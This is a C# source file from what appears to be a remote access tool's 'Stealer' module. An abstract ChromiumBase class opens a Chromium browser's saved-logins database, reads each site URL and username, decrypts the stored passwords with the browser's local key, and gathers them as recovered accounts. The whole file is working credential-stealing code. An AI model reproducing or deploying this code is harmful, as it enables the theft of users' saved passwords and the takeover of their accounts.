using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Stealer.DB;
using FKRemoteDesktop.Stealer.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public abstract class ChromiumBase : IAccountReader
    {
        public abstract string ApplicationName { get; }
        public abstract string KeyName { get; }

        public abstract IEnumerable<RecoveredAccount> ReadAccounts();

        protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
        {
            var result = new List<RecoveredAccount>();
            if (File.Exists(filePath))
            {
                SQLHandler sqlDatabase;
                var decryptor = new ChromiumDecryptor(localStatePath);
                try
                {
                    sqlDatabase = new SQLHandler(filePath);
                }
                catch (Exception ex)
                {
                    result.Add(new RecoveredAccount
                    {
                        KeyName = KeyName,
                        Url = "访问浏览器DB出错: " + ex.Message,
                        Username = "N/A",
                        Password = "N/A",
                        Application = ApplicationName
                    });
                    return result;
                }
                if (!sqlDatabase.ReadTable("logins"))
                {
                    result.Add(new RecoveredAccount
                    {
                        KeyName = KeyName,
                        Url = "浏览器DB中未找到账密信息",
                        Username = "N/A",
                        Password = "N/A",
                        Application = ApplicationName
                    });
                    return result;
                }
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    var user = "";
                    var encryptedPassword = "";
                    var host = "";
                    try
                    {
                        host = sqlDatabase.GetValue(i, "origin_url");
                        user = sqlDatabase.GetValue(i, "username_value");
                        encryptedPassword = sqlDatabase.GetValue(i, "password_value");
                        int encryptedPasswordLen = encryptedPassword.Length;
                        var pass = decryptor.Decrypt(encryptedPasswordLen, encryptedPassword);
                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                        {
                            result.Add(new RecoveredAccount
                            {
                                KeyName = KeyName,
                                Url = host,
                                Username = user,
                                Password = pass,
                                Application = ApplicationName
                            });
                        }
                    }
                    catch (Exception ex)
                    {
                        result.Add(new RecoveredAccount
                        {
                            KeyName = KeyName,
                            Url = "密码解密失败: " + host + " - " +ex.Message,
                            Username = user,
                            Password = encryptedPassword,
                            Application = ApplicationName
                        });
                    }
                }
            }
            else
            {
                throw new FileNotFoundException("未找到该浏览器进程");
            }
            return result;
        }
    }
}